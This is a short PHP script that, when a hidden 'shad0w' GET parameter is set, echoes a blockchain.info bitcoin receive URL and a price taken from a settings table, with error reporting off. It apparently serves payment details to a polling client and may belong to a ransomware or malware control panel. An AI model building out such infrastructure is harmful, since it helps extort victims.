<?php
error_reporting(0);
include "system/config.php";

if(isset($_GET['shad0w'])) {
	$db->go("SELECT * FROM settings");
	while($data = $db->fetchArray()){
		$bitcoin_address = $data['btc_address'];
		$callback_url = $data['callback_url'];
		$bitcoin_url = 'API|https://blockchain.info/id/api/receive?method=create&address='.$bitcoin_address.'&callback='.$callback_url;
		$item_price = $data['price'];
		echo $bitcoin_url.'|'.$item_price;
	}
}